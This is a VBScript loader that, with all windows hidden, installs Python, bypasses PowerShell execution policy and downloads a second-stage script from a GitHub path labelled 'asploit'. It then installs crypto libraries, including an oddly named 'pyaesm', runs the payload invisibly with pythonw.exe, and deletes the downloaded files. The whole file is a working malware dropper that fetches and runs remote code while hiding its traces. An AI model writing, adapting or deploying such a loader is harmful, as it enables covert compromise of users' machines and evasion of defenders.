' loader.vbs
' Single-file script to download and install Python, download a Python script, install libraries, and execute the script silently

' Variables
Dim PYTHON_URL, SCRIPT_URL, PYTHON_VERSION, INSTALL_DIR, SCRIPT_DIR, TEMP_DIR, PYTHON_INSTALLER, SCRIPT_NAME
' Preconfigured URLs
PYTHON_URL = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1_generated.py" ' Example GitHub raw URL for the script

' Extract Python version from the URL (e.g., "3.11.7" → "311")
Dim versionParts, majorMinor
versionParts = Split(PYTHON_URL, "/")
PYTHON_VERSION = versionParts(UBound(versionParts)) ' e.g., "python-3.11.7-amd64.exe"
majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1) ' e.g., "3.11.7"
majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "") ' e.g., "311"

' Set paths
Set WShell = CreateObject("WScript.Shell")
SCRIPT_DIR = WShell.CurrentDirectory ' Directory where loader.vbs is located
INSTALL_DIR = WShell.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python" & majorMinor ' e.g., %LocalAppData%\Programs\Python\Python311

' Generate a unique temporary directory name using a timestamp and random number
Dim timestamp
timestamp = Replace(Replace(Replace(Now, "/", ""), ":", ""), " ", "_") ' e.g., "2025-04-05_12-34-56"
TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\tmp_" & timestamp & "_" & Int((9999 * Rnd) + 1000)
PYTHON_INSTALLER = TEMP_DIR & "\python-installer.exe"
SCRIPT_NAME = TEMP_DIR & "\module.pyw"

' Create a shell object for running commands
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")

' Create temp directory silently, handle if it already exists
If Not FSO.FolderExists(TEMP_DIR) Then
    FSO.CreateFolder TEMP_DIR
End If

' Function to run PowerShell commands silently
Function RunPowerShellCommand(command)
    WShell.Run "powershell.exe -ExecutionPolicy Bypass -Command """ & command & """", 0, True
End Function

' Download the Python installer
RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & PYTHON_URL & "' -OutFile '" & PYTHON_INSTALLER & "' -UseBasicParsing"

' Check if the installer was downloaded
If Not FSO.FileExists(PYTHON_INSTALLER) Then
    If FSO.FolderExists(TEMP_DIR) Then
        FSO.DeleteFolder TEMP_DIR
    End If
    WScript.Quit 1
End If

' Check if Python is already installed
Dim pythonFound, pythonPath
pythonFound = False
On Error Resume Next
WShell.Run "python --version", 0, True
If Err.Number = 0 Then
    pythonFound = True
End If
On Error GoTo 0

' Install Python if not found
If Not pythonFound Then
    ' Install Python silently (per-user installation, no admin rights needed)
    WShell.Run """" & PYTHON_INSTALLER & """ /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_tcltk=1 TargetDir=""" & INSTALL_DIR & """", 0, True

    ' Check if installation succeeded
    If Not FSO.FileExists(INSTALL_DIR & "\python.exe") Then
        If FSO.FolderExists(TEMP_DIR) Then
            FSO.DeleteFolder TEMP_DIR
        End If
        WScript.Quit 1
    End If

    ' Update PATH for the current session
    WShell.Environment("PROCESS")("PATH") = WShell.Environment("PROCESS")("PATH") & ";" & INSTALL_DIR & ";" & INSTALL_DIR & "\Scripts"
End If

' Verify Python is available and get its path
On Error Resume Next
WShell.Run "python --version", 0, True
If Err.Number <> 0 Then
    If FSO.FolderExists(TEMP_DIR) Then
        FSO.DeleteFolder TEMP_DIR
    End If
    WScript.Quit 1
End If
On Error GoTo 0
pythonPath = INSTALL_DIR & "\python.exe"

' Download the Python script after Python is installed
RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & SCRIPT_URL & "' -OutFile '" & SCRIPT_NAME & "' -UseBasicParsing"

' Check if the script was downloaded
If Not FSO.FileExists(SCRIPT_NAME) Then
    If FSO.FolderExists(TEMP_DIR) Then
        FSO.DeleteFolder TEMP_DIR
    End If
    WScript.Quit 1
End If

' Ensure pip is installed
WShell.Run """" & pythonPath & """ -m ensurepip", 0, True

' Install required libraries silently
WShell.Run """" & pythonPath & """ -m pip install --quiet pyaesm urllib3 pycryptodome", 0, True

' Execute the script in the background with pythonw.exe (no console window)
WShell.Run """" & INSTALL_DIR & "\pythonw.exe"" """ & SCRIPT_NAME & """", 0, False

' Cleanup
If FSO.FileExists(PYTHON_INSTALLER) Then
    FSO.DeleteFile PYTHON_INSTALLER
End If
If FSO.FileExists(SCRIPT_NAME) Then
    FSO.DeleteFile SCRIPT_NAME
End If
If FSO.FolderExists(TEMP_DIR) Then
    FSO.DeleteFolder TEMP_DIR
End If

' Exit
WScript.Quit 0
